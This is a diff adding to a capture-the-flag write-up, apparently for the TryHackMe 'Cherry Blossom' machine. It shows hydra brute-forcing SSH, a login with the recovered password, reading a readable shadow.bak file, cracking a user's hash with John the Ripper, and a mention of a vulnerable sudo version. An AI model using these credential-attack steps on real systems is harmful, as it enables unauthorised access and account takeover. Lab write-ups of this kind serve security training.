@@ -266,9 +266,155 @@ Dear Diary,
 ```
 reading throught the dairy, we got 2 usernames `lily, and anitta` also there was a password list in the diary, copied it to a file and let's brute force ssh password for these usernames.
 
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/CheeryBlossom]
+└─$ hydra -l lily -P cherry-blossom.txt 10.10.204.80 ssh                   
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-27 06:39:55
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 9923 login tries (l:1/p:9923), ~621 tries per task
+[DATA] attacking ssh://10.10.204.80:22/
+[STATUS] 146.00 tries/min, 146 tries in 00:01h, 9780 to do in 01:07h, 13 active
+[STATUS] 96.00 tries/min, 288 tries in 00:03h, 9638 to do in 01:41h, 13 active
+[22][ssh] host: 10.10.204.80   login: lily   password: Mr.$un$hin3
+[STATUS] 1417.57 tries/min, 9923 tries in 00:07h, 3 to do in 00:01h, 7 active
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 3 final worker threads did not complete until end.
+[ERROR] 3 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-27 06:47:18
+```
+cool we got the ssh password for user lily. let's login ssh 
+
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/CheeryBlossom]
+└─$ ssh lily@10.10.204.80                      
+The authenticity of host '10.10.204.80 (10.10.204.80)' can't be established.
+ED25519 key fingerprint is SHA256:XrKcwn0LC8rmK7Sx4lz69HLC9cORBWIcCD6j6d0oabg.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.204.80' (ED25519) to the list of known hosts.
+lily@10.10.204.80's password: 
+
+        #####################################
+        ##########  Welcome, Lily  ##########
+        #####################################
+
+lily@cherryblossom:~$ id
+uid=1002(lily) gid=1002(lily) groups=1002(lily)
+lily@cherryblossom:~$ ls -al
+total 72
+drwxr-xr-x 14 lily lily 4096 Feb 22  2020 .
+drwxr-xr-x  4 root root 4096 Feb  9  2020 ..
+lrwxrwxrwx  1 root root    9 Feb  9  2020 .bash_history -> /dev/null
+-rw-r--r--  1 lily lily  220 Apr  4  2018 .bash_logout
+-rw-r--r--  1 lily lily 3771 Apr  4  2018 .bashrc
+drwx------ 11 lily lily 4096 Feb 22  2020 .cache
+drwx------ 11 lily lily 4096 Feb 22  2020 .config
+drwxr-xr-x  2 lily lily 4096 Feb 22  2020 Desktop
+drwxr-xr-x  2 lily lily 4096 Feb 22  2020 Documents
+drwxr-xr-x  2 lily lily 4096 Feb 22  2020 Downloads
+drwx------  3 lily lily 4096 Feb 10  2020 .gnupg
+-rw-------  1 lily lily  346 Feb 22  2020 .ICEauthority
+drwx------  3 lily lily 4096 Feb 22  2020 .local
+drwxr-xr-x  2 lily lily 4096 Feb 22  2020 Music
+drwxr-xr-x  2 lily lily 4096 Feb 22  2020 Pictures
+-rw-r--r--  1 lily lily  807 Apr  4  2018 .profile
+drwxr-xr-x  2 lily lily 4096 Feb 22  2020 Public
+drwxr-xr-x  2 lily lily 4096 Feb 22  2020 Templates
+drwxr-xr-x  2 lily lily 4096 Feb 22  2020 Videos
+lily@cherryblossom:~$ 
+```
+Cool we are in as `lily`
 
 
+## Privilege Escalation
 
+```
+lily@cherryblossom:/var/backups$ ls -al
+total 2000                 
+drwxr-xr-x  2 root root      4096 Feb 10  2020 .
+drwxr-xr-x 14 root root      4096 Apr 26  2018 ..
+-rw-r--r--  1 root root     71680 Feb 10  2020 alternatives.tar.0
+-rw-r--r--  1 root root      3338 Feb  9  2020 alternatives.tar.1.gz
+-rw-r--r--  1 root root      3016 Feb  9  2020 apt.extended_states.0
+-rw-r--r--  1 root root        11 Feb  9  2020 dpkg.arch.0
+-rw-r--r--  1 root root        43 Feb  9  2020 dpkg.arch.1.gz
+-rw-r--r--  1 root root       280 Feb  9  2020 dpkg.diversions.0
+-rw-r--r--  1 root root       160 Feb  9  2020 dpkg.diversions.1.gz
+-rw-r--r--  1 root root       265 Apr 26  2018 dpkg.statoverride.0
+-rw-r--r--  1 root root       190 Apr 26  2018 dpkg.statoverride.1.gz
+-rw-r--r--  1 root root   1510615 Feb  9  2020 dpkg.status.0
+-rw-r--r--  1 root root    402441 Feb  9  2020 dpkg.status.1.gz
+-rw-------  1 root root       936 Feb  9  2020 group.bak
+-rw-------  1 root shadow     771 Feb  9  2020 gshadow.bak
+-rw-------  1 root root      2382 Feb  9  2020 passwd.bak
+-r--r--r--  1 root shadow    1481 Feb  9  2020 shadow.bak
+lily@cherryblossom:/var/backups$ cat shadow.bak 
+```
+cool we hav read access to the `shadow.bak` file... let's check its content.
+
+```
+root:$6$l81PobKw$DE0ra9mYvNY5rO0gzuJCCXF9p08BQ8ALp5clk/E6RwSxxrw97h2Ix9O6cpVHnq1ZUw3a/OCubATvANEv9Od9F1:18301:0:99999:7:::
+daemon:*:17647:0:99999:7:::             
+bin:*:17647:0:99999:7:::
+[snipped]
+johan:$6$zV7zbU1b$FomT/aM2UMXqNnqspi57K/hHBG8DkyACiV6ykYmxsZG.vLALyf7kjsqYjwW391j1bue2/.SVm91uno5DUX7ob0:18301:0:99999:7:::
+lily:$6$3GPkY0ZP$6zlBpNWsBHgo6X5P7kI2JG6loUkZBIOtuOxjZpD71spVdgqM4CTXMFYVScHHTCDP0dG2rhDA8uC18/Vid3JCk0:18301:0:99999:7:::
+sshd:*:18301:0:99999:7:::
+```
+we can see the password hash for user `johan` let's crack the hash 
+
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/CheeryBlossom]
+└─$ cat hash  
+johan:$6$zV7zbU1b$FomT/aM2UMXqNnqspi57K/hHBG8DkyACiV6ykYmxsZG.vLALyf7kjsqYjwW391j1bue2/.SVm91uno5DUX7ob0:18301:0:99999:7:::
+                                                                                                                                                                       
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/CheeryBlossom]
+└─$ john -w=cherry-blossom.txt hash              
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+##scuffleboo##   (johan)     
+1g 0:00:00:09 DONE (2023-02-27 07:18) 0.1051g/s 726.8p/s 726.8c/s 726.8C/s #sharry#1992..#music28
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+cool we got the password, let's `su johan` with that password.
+
+```
+lily@cherryblossom:~$ su johan
+Password: 
+johan@cherryblossom:/home/lily$ cd
+johan@cherryblossom:~$ id
+uid=1001(johan) gid=1001(johan) groups=1001(johan),1003(devs)
+johan@cherryblossom:~$ ls
+user.txt
+johan@cherryblossom:~$ ls -al
+total 48
+drwxr-x---  6 johan johan 4096 Feb 10  2020 .
+drwxr-xr-x  4 root  root  4096 Feb  9  2020 ..
+lrwxrwxrwx  1 johan johan    9 Feb  9  2020 .bash_history -> /dev/null
+-rw-r--r--  1 johan johan  220 Apr  4  2018 .bash_logout
+-rw-r--r--  1 johan johan 3771 Apr  4  2018 .bashrc
+drwx------ 11 johan johan 4096 Feb  9  2020 .cache
+drwx------ 11 johan johan 4096 Feb  9  2020 .config
+drwx------  3 johan johan 4096 Feb  9  2020 .gnupg
+-rw-------  1 johan johan  346 Feb  9  2020 .ICEauthority
+drwx------  3 johan johan 4096 Feb  9  2020 .local
+-rw-r--r--  1 johan johan  807 Apr  4  2018 .profile
+-rw-rw-r--  1 johan johan   38 Feb 10  2020 user.txt
+-rw-rw-r--  1 johan johan  180 Feb  9  2020 .wget-hsts
+johan@cherryblossom:~$ 
+```
+bull's eye we are in as user `johan`
+
+![image](https://user-images.githubusercontent.com/87468669/221492695-81cc34fa-8225-49a9-9404-995ef0904edc.png)
+
+running linpeas.sh, we got to see the sudo version of this target is vuln to overlayfs.
 
 
 
